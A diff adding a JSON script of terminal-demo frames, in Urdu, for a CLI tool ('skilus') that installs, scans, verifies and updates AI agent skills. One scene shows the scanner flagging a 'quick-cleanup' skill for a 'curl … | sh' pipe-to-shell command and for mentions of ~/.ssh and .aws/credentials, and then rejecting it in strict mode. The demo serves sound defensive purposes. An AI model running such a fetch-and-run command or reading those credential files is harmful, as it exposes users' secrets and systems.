@@ -1,0 +1,354 @@
+{
+ "lang": "ur",
+ "cols": 76,
+ "scenes": [
+  {
+   "name": "add",
+   "steps": [
+    [
+     "cmd",
+     "skilus add anthropics/skills"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 اسکلز",
+      "",
+      "<span class=\"b\">کون سی اسکلز انسٹال کروں؟</span>",
+      "<span class=\"d\">↑↓ حرکت · اسپیس نشان · → سب · ← کوئی نہیں · فلٹر کے لیے لکھیں · Enter قبول</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ مزید 7</span>",
+      "<span class=\"d\">  19 میں سے 19 نشان زد</span>"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 اسکلز",
+      "",
+      "<span class=\"b\">کون سی اسکلز انسٹال کروں؟</span>",
+      "<span class=\"d\">↑↓ حرکت · اسپیس نشان · → سب · ← کوئی نہیں · فلٹر کے لیے لکھیں · Enter قبول</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  [ ] <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  [ ] <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  [ ] <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  [ ] <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  [ ] <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  [ ] <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  [ ] <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  [ ] <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  [ ] <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  [ ] <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  [ ] <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ مزید 7</span>",
+      "<span class=\"d\">  19 میں سے 0 نشان زد</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 اسکلز",
+      "",
+      "<span class=\"b\">کون سی اسکلز انسٹال کروں؟</span>",
+      "<span class=\"d\">↑↓ حرکت · اسپیس نشان · → سب · ← کوئی نہیں · فلٹر کے لیے لکھیں · Enter قبول</span>",
+      "<span class=\"d\">فلٹر:</span> <span class=\"b\">p</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">claude-api    </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK — model…</span>",
+      "  [ ] <span class=\"b\">mcp-builder   </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Context P…</span>",
+      "  [ ] <span class=\"b\">pdf           </span>  <span class=\"d\">Use this skill whenever the user wants to do anythin…</span>",
+      "  [ ] <span class=\"b\">pptx          </span>  <span class=\"d\">Use this skill any time a .pptx or .potx file is inv…</span>",
+      "  [ ] <span class=\"b\">webapp-testing</span>  <span class=\"d\">Toolkit for interacting with and testing local web a…</span>",
+      "<span class=\"d\">  19 میں سے 5 ملتے ہیں · 0 نشان زد</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 اسکلز",
+      "",
+      "<span class=\"b\">کون سی اسکلز انسٹال کروں؟</span>",
+      "<span class=\"d\">↑↓ حرکت · اسپیس نشان · → سب · ← کوئی نہیں · فلٹر کے لیے لکھیں · Enter قبول</span>",
+      "<span class=\"d\">فلٹر:</span> <span class=\"b\">pd</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  19 میں سے 1 ملتے ہیں · 0 نشان زد</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 اسکلز",
+      "",
+      "<span class=\"b\">کون سی اسکلز انسٹال کروں؟</span>",
+      "<span class=\"d\">↑↓ حرکت · اسپیس نشان · → سب · ← کوئی نہیں · فلٹر کے لیے لکھیں · Enter قبول</span>",
+      "<span class=\"d\">فلٹر:</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  19 میں سے 1 ملتے ہیں · 0 نشان زد</span>"
+     ],
+     700
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 اسکلز",
+      "",
+      "<span class=\"b\">کون سی اسکلز انسٹال کروں؟</span>",
+      "<span class=\"d\">↑↓ حرکت · اسپیس نشان · → سب · ← کوئی نہیں · فلٹر کے لیے لکھیں · Enter قبول</span>",
+      "<span class=\"d\">فلٹر:</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  19 میں سے 1 ملتے ہیں · 1 نشان زد</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 اسکلز",
+      "",
+      "<span class=\"b\">کون سی اسکلز انسٹال کروں؟</span> pdf",
+      "<span class=\"b\">کن ایجنٹس میں؟</span>",
+      "<span class=\"d\">↑↓ حرکت · اسپیس نشان · → سب · ← کوئی نہیں · فلٹر کے لیے لکھیں · Enter قبول</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">Claude Code</span>  <span class=\"d\">.claude/skills</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">Codex      </span>  <span class=\"d\">.agents/skills</span>",
+      "  74 میں سے 2 ایجنٹ انسٹال ہیں · باقی کے لیے --agent &lt;id&gt; (فہرست skilus ag…"
+     ],
+     1600
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 اسکلز",
+      "",
+      "<span class=\"b\">کون سی اسکلز انسٹال کروں؟</span> pdf",
+      "<span class=\"b\">کن ایجنٹس میں؟</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 اسکل",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 فائلیں · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: قابلِ عمل فائل؛ اسے allow: [scripts]",
+      "    سے قبول کریں <span class=\"d\">[executable]</span>",
+      "",
+      "منزلیں: .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 اسکل · 0 رکاوٹیں · <span class=\"y\">1 انتباہ</span>",
+      "انسٹال کریں؟ [ہ/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 اسکلز",
+      "",
+      "<span class=\"b\">کون سی اسکلز انسٹال کروں؟</span> pdf",
+      "<span class=\"b\">کن ایجنٹس میں؟</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 اسکل",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 فائلیں · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: قابلِ عمل فائل؛ اسے allow: [scripts]",
+      "    سے قبول کریں <span class=\"d\">[executable]</span>",
+      "",
+      "منزلیں: .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 اسکل · 0 رکاوٹیں · <span class=\"y\">1 انتباہ</span>",
+      "انسٹال کریں؟ [ہ/N] ہ",
+      "",
+      "pdf (32cdced3a21a) کو 2 منزلوں میں انسٹال کیا گیا۔"
+     ],
+     2600
+    ]
+   ]
+  },
+  {
+   "name": "inspect",
+   "steps": [
+    [
+     "cmd",
+     "skilus inspect ./downloads/quick-cleanup"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">downloads/quick-cleanup</span> · 1 اسکل",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 فائلیں · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: اسناد کا ذکر کرتا ہے: ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: قابلِ عمل فائل؛ اسے allow: [scripts] سے قبول کریں",
+      "    <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: کوڈ ڈاؤن لوڈ کر کے چلاتا ہے: curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: اسناد کا ذکر کرتا ہے: .aws/credentials",
+      "    <span class=\"d\">[credential-access]</span>",
+      "",
+      "1 اسکل · 0 رکاوٹیں · <span class=\"y\">4 انتباہات</span>"
+     ],
+     2600
+    ],
+    [
+     "clear"
+    ],
+    [
+     "cmd",
+     "skilus add ./downloads/quick-cleanup --strict -y"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">./downloads/quick-cleanup</span> · 1 اسکل",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 فائلیں · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: اسناد کا ذکر کرتا ہے: ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: قابلِ عمل فائل؛ اسے allow: [scripts] سے قبول کریں",
+      "    <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: کوڈ ڈاؤن لوڈ کر کے چلاتا ہے: curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: اسناد کا ذکر کرتا ہے: .aws/credentials",
+      "    <span class=\"d\">[credential-access]</span>",
+      "",
+      "منزلیں: .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 اسکل · 0 رکاوٹیں · <span class=\"y\">4 انتباہات</span>",
+      "skilus: quick-cleanup: --strict کے ساتھ 4 انتباہات: جانچ نے مسترد کر دیا"
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "5"
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "verify",
+   "steps": [
+    [
+     "cmd",
+     "echo \"# tweak\" >> .claude/skills/pdf/SKILL.md"
+    ],
+    [
+     "frame",
+     [],
+     600
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "تبدیل شدہ pdf (project، claude-code) در ~/acme-app/.claude/skills/pdf",
+      "  تبدیل شدہ: SKILL.md",
+      "انہیں بحال کرنے کے لیے skilus sync چلائیں (اگر آپ نے ہاتھ سے بدلی ہیں تو --force کے ساتھ)۔"
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "6"
+     ],
+     1200
+    ],
+    [
+     "cmd",
+     "skilus sync --force"
+    ],
+    [
+     "frame",
+     [
+      "pdf کو ~/acme-app/.claude/skills/pdf میں بدل دیا گیا",
+      "ہم آہنگ: 0 انسٹال، 1 تبدیل، 5 بغیر تبدیلی۔"
+     ],
+     900
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "سب ٹھیک ہے: 3 اسکل(ز) 6 منزل(وں) میں لاک سے میل کھاتی ہیں۔"
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "update",
+   "steps": [
+    [
+     "cmd",
+     "skilus update --check"
+    ],
+    [
+     "frame",
+     [
+      "اسکل       دائرہ    REF             انسٹال شدہ    تازہ ترین     حالت",
+      "changelog  project  (طے شدہ برانچ)  9563a12b25b5  1b288cd0c1c1  نیا ورژن دستیاب",
+      "pdf        project  (طے شدہ برانچ)  dbd4588f9e10  dbd4588f9e10  تازہ",
+      "review     project  (طے شدہ برانچ)  9563a12b25b5  1b288cd0c1c1  نیا ورژن دستیاب"
+     ],
+     1800
+    ],
+    [
+     "cmd",
+     "skilus update review"
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> کوئی نتیجہ نہیں",
+      "",
+      "1 اسکل · 0 رکاوٹیں · 0 انتباہات",
+      "اپ ڈیٹ کریں؟ [ہ/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> کوئی نتیجہ نہیں",
+      "",
+      "1 اسکل · 0 رکاوٹیں · 0 انتباہات",
+      "اپ ڈیٹ کریں؟ [ہ/N] ہ",
+      "",
+      "review کو 1b288cd0c1c1 (1c92660a3b6f) پر اپ ڈیٹ کیا گیا۔"
+     ],
+     3200
+    ]
+   ]
+  }
+ ]
+}
